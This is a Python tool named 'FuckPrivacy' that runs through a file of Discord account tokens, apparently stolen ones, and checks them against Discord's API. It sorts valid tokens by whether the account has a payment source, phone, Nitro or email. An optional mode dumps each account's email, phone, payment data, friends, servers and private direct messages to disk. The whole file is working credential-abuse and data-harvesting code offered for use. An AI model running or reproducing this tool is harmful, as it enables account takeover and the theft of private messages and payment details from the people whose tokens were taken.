import os
import colorama
from colorama import Fore, Back, Style
import requests
import warnings
warnings.filterwarnings("ignore")

tokenf = input(colorama.Fore.GREEN + "Enter token file: ")
modechoice = input(colorama.Fore.GREEN + "Enter mode (1 for normal checker, 2 for advanced parser): ")
if modechoice == "1":
    modechoice = "normal"
elif modechoice == "2":
    modechoice = "advanced"
else:
    print(colorama.Fore.RED + "Invalid mode choice.")
    exit()
if modechoice == "advanced":
    dmChoice = input(colorama.Fore.GREEN + "Do you want to parse/save DMs? (y/n): ")
    if dmChoice == "y" or dmChoice == "Y" or dmChoice == "yes" or dmChoice == "Yes":
        dmChoice = True
    elif dmChoice == "n" or dmChoice == "N" or dmChoice == "no" or dmChoice == "No":
        dmChoice = False
    else:
        print(colorama.Fore.RED + "Invalid choice.")
        exit()
os.system("cls")
print("""
——————————No Security?—————————————
⠀⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝
⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇
⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀
⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀
⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀
⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
———————————————————————————
""")
print(colorama.Fore.RED + "FuckPrivacy is starting...")
print(colorama.Fore.RED + "Creating new folder and starting...")        
if modechoice == "advanced":
    while True:
        with open(tokenf, "r") as f:
            tokens = f.readlines()
        try:
            token = tokens[0].strip()
        except IndexError:
            print(colorama.Fore.RED + "No tokens left.")
            exit()
        del tokens[0]
        with open(tokenf, "w") as f:
            f.writelines(tokens)
        r = requests.get("https://discordapp.com/api/v6/users/@me", headers={"Authorization": token})
        if r.status_code == 200:
            uservalid = True
            username = r.json()["username"]
            discriminator = r.json()["discriminator"]
            try:
                avatar = r.json()["avatar"]
                avatar = str(avatar)
            except:
                avatar = None
            try:
                banner = r.json()["banner"]
                banner = str(banner)
            except:
                banner = "None"
            bio = r.json()["bio"]
            locale = r.json()["locale"]
            uid = r.json()["id"]
            try:
                premium_type = r.json()["premium_type"]
            except:
                premium_type = "0"
            try:
                email = r.json()["email"]
            except:
                email = "None"
            try:
                phone = r.json()["phone"]
                phone = str(phone)
            except:
                phone = "None"
            verified = r.json()["verified"]
            mfa_enabled = r.json()["mfa_enabled"]
        else:
            uservalid = False
        if uservalid == True:
            mkdiruser = str(username + discriminator)
            mkdiruser = mkdiruser.replace(" ", "")
            mkdiruser = mkdiruser.replace("#", "")
            mkdiruser = mkdiruser.replace(":", "")
            mkdiruser = mkdiruser.replace("?", "")
            mkdiruser = mkdiruser.replace("/", "")
            mkdiruser = mkdiruser.replace("\\", "")
            mkdiruser = mkdiruser.replace("*", "")
            mkdiruser = mkdiruser.replace("|", "")
            mkdiruser = mkdiruser.replace("<", "")
            mkdiruser = mkdiruser.replace(">", "")
            mkdiruser = mkdiruser.replace('"', "")
            mkdiruser = mkdiruser.replace("'", "")
            mkdiruser = mkdiruser.replace(".", "")
            mkdiruser = mkdiruser.replace("CON", "")
            mkdiruser = mkdiruser.replace("PRN", "")
            mkdiruser = mkdiruser.replace("AUX", "")
            mkdiruser = mkdiruser.replace("NUL", "")
            mkdiruser = mkdiruser.replace("COM1", "")
            mkdiruser = mkdiruser.replace("COM2", "")
            mkdiruser = mkdiruser.replace("COM3", "")
            mkdiruser = mkdiruser.replace("COM4", "")
            mkdiruser = mkdiruser.replace("COM5", "")
            mkdiruser = mkdiruser.replace("COM6", "")
            mkdiruser = mkdiruser.replace("COM7", "")
            mkdiruser = mkdiruser.replace("COM8", "")
            mkdiruser = mkdiruser.replace("COM9", "")
            mkdiruser = mkdiruser.replace("LPT1", "")
            mkdiruser = mkdiruser.replace("LPT2", "")
            mkdiruser = mkdiruser.replace("LPT3", "")
            mkdiruser = mkdiruser.replace("LPT4", "")
            mkdiruser = mkdiruser.replace("LPT5", "")
            mkdiruser = mkdiruser.replace("LPT6", "")
            mkdiruser = mkdiruser.replace("LPT7", "")
            mkdiruser = mkdiruser.replace("LPT8", "")
            mkdiruser = mkdiruser.replace("LPT9", "")
            os.makedirs(mkdiruser)
            os.chdir(mkdiruser)
            f = open("basic_info.txt", "w", encoding="utf-8")
            f.write("Token: " + token + "\n")
            f.write("\n")
            f.write("Username: " + username + "#" + discriminator + "\n")
            f.write("Avatar: " + avatar + "\n")
            f.write("Banner: " + banner + "\n")
            bio = str(bio)
            bio = bio.replace("\n", " ")
            f.write("Bio: " + bio + "\n")
            f.write("Locale: " + locale + "\n")
            f.write("ID: " + uid + "\n")
            if premium_type == 0:
                f.write("Nitro: No" + "\n")
            elif premium_type == 1:
                f.write("Nitro: Nitro Classic" + "\n")
            elif premium_type == 2:
                f.write("Nitro: Nitro Boost" + "\n")
            f.write("Email: " + email + "\n")
            f.write("Phone: " + phone + "\n")
            if verified == True:
                f.write("Verified: Yes" + "\n")
            elif verified == False:
                f.write("Verified: No" + "\n")
            if mfa_enabled == True:
                f.write("2FA: Enabled" + "\n")
            elif mfa_enabled == False:
                f.write("2FA: Disabled" + "\n")
            f.close()
            r = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"Authorization": token})
            if r.status_code == 200:
                f = open("payment_info.txt", "w", encoding="utf-8")
                f.write("Token: " + token + "\n")
                f.write("\n")
                f.write("Payment info: " + str(r.json()) + "\n")
                f.close()
            else:
                print(colorama.Fore.RED + "Failed to parse payment info for" + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
            r = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={"Authorization": token})
            if r.status_code == 200:
                friends = r.json()
            else:
                print(colorama.Fore.RED + "Failed to parse friends for " + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
            f = open("friends.txt", "w", encoding="utf-8")
            for friend in friends:
                f.write(friend["user"]["username"] + "#" + friend["user"]["discriminator"] + " | ID:" + friend["user"]["id"] +"\n")
            f.close()
            r = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers={"Authorization": token})
            if r.status_code == 200:
                servers = r.json()
            else:
                print(colorama.Fore.RED + "Failed to parse servers for " + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
            f = open("servers.txt", "w", encoding="utf-8")
            for server in servers:
                f.write(server["name"] + " | ID:" + server["id"] + "| Owner:" + str(server["owner"]) + "\n")
            f.close()
            if dmChoice == True:
                os.makedirs("DMs")
                os.chdir("DMs")
                r = requests.get("https://discordapp.com/api/v6/users/@me/channels", headers={"Authorization": token})
                if r.status_code == 200:
                    dms = r.json()
                else:
                    print(colorama.Fore.RED + "Failed to parse DMs for " + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
                for dm in dms:
                    f = open(dm["id"] + ".txt", "w", encoding="utf-8")
                    r = requests.get("https://discordapp.com/api/v6/channels/" + dm["id"] + "/messages?limit=100", headers={"Authorization": token})
                    if r.status_code == 200:
                        messages = r.json()
                    else:
                        print(colorama.Fore.RED + "Failed to parse messages from " + dm["id"] + "!")
                    for message in messages:
                        f.write(message["author"]["username"] + "#" + message["author"]["discriminator"] + ": " + message["content"] + "\n")
                    f.close()
                os.chdir("..")
            os.chdir("..")
            print(colorama.Fore.RED + "Parsed " + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
        else:
            print(colorama.Fore.RED + "Invalid token " + colorama.Fore.YELLOW + token + colorama.Fore.RED + "!")
elif modechoice == "normal":
    while True:
        with open(tokenf, "r") as f:
            tokens = f.readlines()
        try:
            token = tokens[0].strip()
        except IndexError:
            print(colorama.Fore.RED + "No tokens left.")
            exit()
        del tokens[0]
        with open(tokenf, "w") as f:
            f.writelines(tokens)
        r = requests.get("https://discordapp.com/api/v6/users/@me", headers={"Authorization": token})
        if r.status_code == 200:
            uservalid = True
            username = r.json()["username"]
            discriminator = r.json()["discriminator"]
            try:
                avatar = r.json()["avatar"]
                avatar = str(avatar)
            except:
                avatar = None
            try:
                banner = r.json()["banner"]
                banner = str(banner)
            except:
                banner = "None"
            bio = r.json()["bio"]
            locale = r.json()["locale"]
            uid = r.json()["id"]
            try:
                premium_type = r.json()["premium_type"]
                if premium_type == 0:
                    premiumY = False
                elif premium_type == 1:
                    premiumY = True
                elif premium_type == 2:
                    premiumY = True
            except:
                premium_type = "0"
            try:
                email = r.json()["email"]
                emailY = True
            except:
                email = "None"
                emailY = False
            try:
                phone = r.json()["phone"]
                phone = str(phone)
                if phone == "None":
                    phoneY = False
                else:
                    phoneY = True
            except:
                phone = "None"
            verified = r.json()["verified"]
            if verified == False:
                verified = "Yes"
            elif verified == False:
                verified = False
            mfa_enabled = r.json()["mfa_enabled"]
        else:
            uservalid = False
        if uservalid == True:
            r = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"Authorization": token})
            if r.status_code == 200:
                paymentinfo = r.json()
                if paymentinfo == []:
                    payment = False
                else:
                    payment = True
            else:
                payment = False
            f = open("valid.txt", "a", encoding="utf-8")
            f.write(f"{token}\n")
            f.close()
            if payment == True:
                f = open("payment.txt", "a", encoding="utf-8")
                f.write(f"{token}\n")
                f.close()
            if phoneY == True:
                f = open("phone.txt", "a", encoding="utf-8")
                f.write(f"{token}\n")
                f.close()
            if premiumY == True:
                f = open("nitro.txt", "a", encoding="utf-8")
                f.write(f"{token}\n")
                f.close()
            if emailY == True:
                f = open("email.txt", "a", encoding="utf-8")
                f.write(f"{token}\n")
                f.close()
        if uservalid == True:
            print(colorama.Fore.RED + "Token " + colorama.Fore.YELLOW + token + colorama.Fore.RED + " valid!")
        elif uservalid == False:
            print(colorama.Fore.RED + "Token " + colorama.Fore.YELLOW + token + colorama.Fore.RED + " invalid!")
